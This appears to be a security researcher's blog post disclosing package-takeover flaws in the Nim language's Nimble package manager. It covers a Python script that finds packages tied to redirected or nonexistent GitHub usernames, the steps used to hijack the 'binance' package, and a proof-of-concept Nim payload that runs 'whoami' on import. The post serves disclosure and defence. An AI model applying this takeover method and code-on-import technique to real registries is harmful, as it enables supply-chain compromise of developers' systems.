---
layout: post
title: "Package Takeover: Supply Chain Security Vulnerability in Nimble Package Manager"
date: 2026-01-24
author: Yunus Aydın
lang: en
description: "Supply chain security vulnerabilities I discovered in Nimble package manager. URL redirection and nonexistent username exploit techniques for package takeover."
keywords: "supply chain security, Nimble package manager, package takeover, security vulnerability, URL redirection, GitHub username, security research, supply chain attack"
canonical_url: "https://aydinnyunus.github.io/2026/01/24/supply-chain-security-hacking-nimble-packages/"
---

Package managers are critical components of the software development process. However, these tools are not immune to security vulnerabilities. In this post, I'll explain two critical vulnerabilities I discovered in the Nimble package manager and how I exploited them. I analyzed 2,393 packages and found 139 to be vulnerable. This is a real-world case study demonstrating how important supply chain security is.

## What is Nimble?

Nimble is a package manager for the Nim programming language. It provides an easy way for developers to manage libraries and dependencies. Through a platform called `nimble.directory`, developers can publish their packages, making it easier for others to use and integrate these libraries into their projects.

![nimble.directory](https://nimble.directory)

The platform uses GitHub repositories as sources. Each package is associated with a GitHub URL and username. I found security vulnerabilities in this association mechanism.

## The Vulnerabilities: URL Redirection and Nonexistent Username

I discovered two critical vulnerabilities:

### 1. URL Redirection Vulnerability

When a package's GitHub URL is redirected, it's possible to take over the previous URL before the redirection occurs. If the original URL is no longer valid, an attacker can seize control of the package.

**How it works:**

- Package A has URL `github.com/user-old/repo`
- This URL redirects to `github.com/user-new/repo`
- If the `user-old` account is deleted or the repo is moved, an attacker can create the `user-old` account and use the same repo name to take over the package

### 2. Nonexistent Username Vulnerability

If a GitHub username associated with a Nimble package doesn't exist, this can be leveraged to claim ownership of the package.

**How it works:**

- Package B has URL `github.com/nonexistent-user/package`
- The `nonexistent-user` account doesn't exist on GitHub
- An attacker can create the `nonexistent-user` account and use the same repo name to take over the package

## How I Discovered These Vulnerabilities

I wrote a Python script to analyze all packages. The script performed two main checks:

1. **URL redirection check**: Checked if each package's GitHub URL was redirected
2. **Username existence check**: Checked if the GitHub username existed

### Analysis Script

```python
import requests

def check_redirected_url(package_url):
    try:
        response = requests.head(package_url, allow_redirects=True)
        if response.history:
            return response.history[-1].url
    except requests.RequestException as e:
        print(f"Error checking URL {package_url}: {e}")
    return None

def check_username_existence(username):
    try:
        response = requests.get(f'https://github.com/{username}')
        return response.status_code != 404
    except requests.RequestException as e:
        print(f"Error checking username {username}: {e}")
    return False

# Analyze all packages
for package in all_packages:
    redirected_url = check_redirected_url(package.github_url)
    if redirected_url:
        print(f"Redirected URL found: {redirected_url}")
    
    username = package.username
    if not check_username_existence(username):
        print(f"Username {username} does not exist. Possible takeover.")
```

### Results

- **Total packages analyzed**: 2,393
- **Vulnerable packages found**: 139
- **Vulnerability rate**: ~5.8%

These numbers demonstrate how critical supply chain security is. Even in a small package manager, hundreds of vulnerable packages can be found.

## Case Study: Taking Over the binance Package

One of the most interesting case studies was the "binance" package. This package was previously hosted at `https://github.com/Imperator26/binance`. I took over the package by exploiting the URL redirection vulnerability.

### Exploitation Steps

1. **URL check**: Checked if the package's GitHub URL was redirected
2. **Account creation**: Since the original URL was no longer valid, I created a new repository using the same username and repo name
3. **Malicious payload**: Added malicious code to the package
4. **Publishing**: Published the package to the Nimble directory

### Malicious Payload

I added a script to the new version of the package that executes the `whoami` command when imported:

```nim
import osproc

proc runCommand(cmd: string) =
  let result = execProcess(cmd)
  echo result

runCommand("whoami")
```

This code runs automatically when the package is imported. The `whoami` command displays the current username, proving that the code executed successfully.

### Exploit Result

When a user imports the package:

```nim
import binance
echo "binance package imported successfully!"
```

The output is:

```text
yunus.aydin
binance package imported successfully!
```

The `whoami` command shows the current username. This proves that the malicious package executed successfully and can run code on the target system.

## Impact Assessment

These vulnerabilities pose serious risks to supply chain security:

### Potential Attack Scenarios

1. **Malicious code injection**: An attacker can add malicious code to a hijacked package
2. **Data exfiltration**: The package can collect user data and send it to the attacker
3. **Backdoor installation**: The package can install a persistent backdoor on the system
4. **Credential theft**: The package can steal user credentials

### Real-World Impact

- **Developers**: Developers using vulnerable packages are at risk
- **Users**: Users running applications that use these packages can be affected
- **Organizations**: Packages used in corporate projects can affect the entire organization

### Statistics

- **2,393 packages** analyzed
- **139 vulnerable packages** found
- **~5.8% vulnerability rate** detected

These numbers show how critical package managers are from a security perspective. Even in a small package manager, hundreds of vulnerable packages can be found.

## Security Recommendations

Recommendations for package managers and developers:

### For Package Managers

1. **URL validation**: Regularly check the validity of package URLs
2. **Username verification**: Verify that GitHub usernames exist
3. **Redirect monitoring**: Monitor URL redirects and alert on them
4. **Package ownership verification**: Add mechanisms to verify package ownership

### For Developers

1. **Package audit**: Regularly check the packages you use
2. **Dependency pinning**: Pin package versions
3. **Security scanning**: Run security scans on packages
4. **Trust verification**: Ensure package owners are trustworthy

## Conclusion

This research demonstrates how critical package manager security is. URL redirection and nonexistent username vulnerabilities pose serious risks to supply chain security. Package managers and developers need to take measures against such vulnerabilities.

**Key takeaways:**

- Package managers are critical infrastructure components from a security perspective
- URL validation and username verification mechanisms are essential
- Regular security audits and monitoring are required
- Developers should regularly check the packages they use

Supply chain security is one of the most important topics in modern software development. Finding and fixing such vulnerabilities improves the security of the entire ecosystem.

## Related Content

- [SQL Injection Vulnerability: Security Issue in GeoPandas to_postgis() Function](/2025/12/27/sql-injection-geopandas/)
- [CVE-2025-66019: LZW Decompression DoS Vulnerability in pypdf Library](/2025/12/20/cve-2025-66019-pypdf-lzw-dos/)
